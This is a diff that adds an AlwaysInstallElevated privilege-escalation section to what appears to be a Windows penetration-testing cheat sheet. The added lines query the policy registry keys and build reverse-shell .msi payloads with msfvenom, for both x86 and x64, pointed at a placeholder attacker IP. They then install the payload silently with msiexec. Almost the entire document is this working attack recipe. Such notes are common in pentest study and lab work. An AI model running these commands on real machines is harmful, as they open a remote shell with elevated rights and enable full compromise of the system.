@@ -3910,6 +3910,18 @@ EnableLUA REG_DWORD 0x1
 ConsentPromptBehaviorAdmin REG_DWORD 0x5
 ## 0 = don't prompt, 1 = prompt
 PromptOnSecureDesktop REG_DWORD 0x1
+
+# AlwaysInstallElevated
+## check whether AlwaysInstallElevated is enabled : 0, disabled, 1 = enabled
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+## generate malicious .msi
+### x86
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f msi -a x86 -o shell.msi
+### x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f msi -a x64 -o shell.msi
+## execute .msi
+msiexec /quiet /qn /i C:\path\to\msi
 ```
 
 
